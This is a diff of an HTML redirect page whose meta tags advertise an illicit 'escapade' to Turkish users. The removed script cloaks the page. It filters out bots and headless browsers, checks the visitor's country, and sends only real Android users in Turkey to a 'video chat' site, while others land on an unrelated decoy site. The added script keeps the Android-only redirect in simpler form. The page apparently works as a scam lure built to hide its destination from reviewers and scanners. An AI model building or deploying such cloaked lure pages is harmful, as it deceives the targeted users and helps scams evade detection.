@@ -26,78 +26,50 @@
   <meta name="twitter:description" content="Kaçamak mı yapmak istiyorsunuz tam size göre !">
   <meta name="twitter:image" content="https://elleader.vercel.app/asd.jpg">
 
+<head>
+  <meta charset="UTF-8" />
+  <title>Yönlendiriliyorsunuz...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
-      background: #f1f3f4;
       display: flex;
       justify-content: center;
       align-items: center;
       height: 100vh;
       margin: 0;
-    }
-    .loader {
-      border: 4px solid rgba(0,0,0,0.1);
-      border-radius: 50%;
-      border-top: 4px solid #4285F4;
-      width: 40px;
-      height: 40px;
-      animation: spin 0.8s linear infinite;
-    }
-    @keyframes spin {
-      0% { transform: rotate(0deg); }
-      100% { transform: rotate(360deg); }
+      font-family: Arial, sans-serif;
+      background: #f1f3f4;
+      color: #333;
     }
   </style>
-
-  <script>
-    // Android cihaz tespiti (Gelişmiş)
-    function isRealAndroid() {
-      const ua = navigator.userAgent.toLowerCase();
-      const touch = 'ontouchstart' in window;
-      const bot = navigator.webdriver || /HeadlessChrome|PhantomJS/i.test(ua);
-
-      // Daha esnek eşleşme
-      return ua.includes('android') && !bot && touch;
-    }
-
-    // Türkiye kontrolü
-    async function isFromTurkey() {
-      try {
-        const res = await fetch("https://api.country.is");
-        const data = await res.json();
-        return data.country === "TR";
-      } catch {
-        return true; // fallback
-      }
-    }
-
-    async function redirect() {
-      const android = isRealAndroid();
-      const turkey = await isFromTurkey();
-
-      if (android && turkey) {
-        if (typeof ym !== 'undefined') {
-          ym(103636543, 'reachGoal', 'android_redirect', {
-            screen: ${screen.width}x${screen.height},
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
-          });
-        }
-        window.location.href = "https://goruntulusohbetzamani.vercel.app/";
-      } else {
-        window.location.href = "https://www.kocalar.com.tr/";
-      }
-    }
-
-    // Başlat
-    window.addEventListener('load', () => {
-      setTimeout(redirect, 800); // Azıcık bekletme
-    });
-  </script>
 </head>
 <body>
-  <div class="loader"></div>
-  <noscript>
-    <meta http-equiv="refresh" content="0; url=https://www.kocalar.com.tr/">
-  </noscript>
+  <div id="status">Yükleniyor, lütfen bekleyin...</div>
+
+  <script>
+    function isAndroid() {
+      const ua = navigator.userAgent.toLowerCase();
+      return ua.includes('android') || ua.includes('linux; android');
+    }
+
+    function redirect() {
+      const status = document.getElementById('status');
+
+      if (isAndroid()) {
+        status.textContent = 'Android cihaz tespit edildi, yönlendiriliyorsunuz...';
+        setTimeout(() => {
+          window.location.href = 'https://goruntulusohbetzamani.vercel.app/';
+        }, 500);
+      } else {
+        status.textContent = 'Android cihaz bulunamadı, alternatif sayfaya yönlendiriliyorsunuz...';
+        setTimeout(() => {
+          window.location.href = 'https://www.kocalar.com.tr/';
+        }, 500);
+      }
+    }
+
+    // Yönlendirmeyi başlat
+    window.onload = redirect;
+  </script>
 </body>
 </html>
